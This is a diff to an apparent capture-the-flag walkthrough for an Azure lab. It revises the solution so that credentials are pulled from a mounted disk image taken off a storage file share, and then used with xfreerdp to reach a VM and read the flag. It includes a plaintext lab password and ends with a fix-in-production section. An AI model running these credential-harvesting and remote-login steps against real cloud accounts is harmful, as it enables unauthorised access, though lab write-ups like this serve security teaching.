@@ -27,7 +27,13 @@ az storage file download  -->  acc_noher.img
 sudo mount -o loop acc_noher.img /mnt/cs
     |
     v
-cat /mnt/cs/flag.txt
+cat /mnt/cs/vm_access.txt  -->  RDP credentials
+    |
+    v
+xfreerdp /v:<vm-ip> /u:ytirucsboybytiruces /p:... /cert-ignore
+    |
+    v
+type C:\flag.txt
 ```
 
 ### Step 1 — Find the file share
@@ -46,13 +52,32 @@ az storage file download \
   --dest ./acc_noher.img
 ```
 
-### Step 3 — Mount and read
+### Step 3 — Mount and extract credentials
 
 ```bash
 sudo mkdir -p /mnt/cs
 sudo mount -o loop acc_noher.img /mnt/cs
-cat /mnt/cs/flag.txt
+ls /mnt/cs               # vm_access.txt is visible here
+cat /mnt/cs/vm_access.txt
 sudo umount /mnt/cs
+```
+
+### Step 4 — Get the VM public IP
+
+```bash
+az vm show -g admin-vm-rg -n admin-vm --show-details --query publicIps -o tsv
+```
+
+### Step 5 — RDP into the VM and read the flag
+
+```bash
+xfreerdp /v:<vm-ip> /u:ytirucsboybytiruces /p:'IWillNotRememberThisPassword1.' /cert-ignore /f
+```
+
+Once connected, open a terminal and run:
+
+```
+type C:\flag.txt
 ```
 
 ## How to Fix in Production
